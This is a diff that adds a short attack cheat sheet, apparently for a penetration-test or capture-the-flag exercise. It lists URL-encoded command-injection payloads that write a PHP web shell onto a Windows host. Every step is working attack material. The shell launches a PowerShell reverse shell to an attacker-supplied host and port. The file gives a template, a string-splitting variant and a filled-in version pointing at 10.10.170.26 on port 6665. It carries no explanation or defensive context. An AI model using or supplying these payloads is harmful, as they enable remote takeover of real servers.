@@ -1,0 +1,28 @@
+  pwd:
+cmd=echo%20%25cd%25
+
+  create file:
+cmd=copy NUL [filename]
+cmd=copy NUL split.php
+
+  append shellcode into file:
+cmd=echo ^<?php >> [filename]
+cmd=echo $str = "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('[LHOST]',[LPORT]);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535^|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2^>^%261 ^| Out-String );\$sendback2 = \$sendback %2B 'PS ' %2B (pwd).Path %2B '^> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""; >> [filename]
+cmd=echo system($str); >> [filename]
+cmd=echo ?^>  >> [filename]
+
+  split string version:
+cmd=echo ^<?php >> [filename]
+cmd=echo $str = "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient >> [filename]
+cmd=echo ('[LHOST]',[LPORT]);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535^|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2^>^%261 ^| Out-String );\$sendback2 = \$sendback %2B 'PS ' %2B (pwd).Path %2B '^> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""; >> [filename]
+cmd=echo $str = str_replace("\n","",$str);
+cmd=echo system($str); >> [filename]
+cmd=echo ?^>  >> [filename]
+
+
+cmd=echo ^<?php >> split.php
+cmd=echo $str = "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient >> split.php
+cmd=echo ('10.10.170.26',6665);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535^|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2^>^%261 ^| Out-String );\$sendback2 = \$sendback %2B 'PS ' %2B (pwd).Path %2B '^> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""; >> split.php
+cmd=echo $str = str_replace("\n","",$str); >> split.php
+cmd=echo system($str); >> split.php
+cmd=echo ?^>  >> split.php
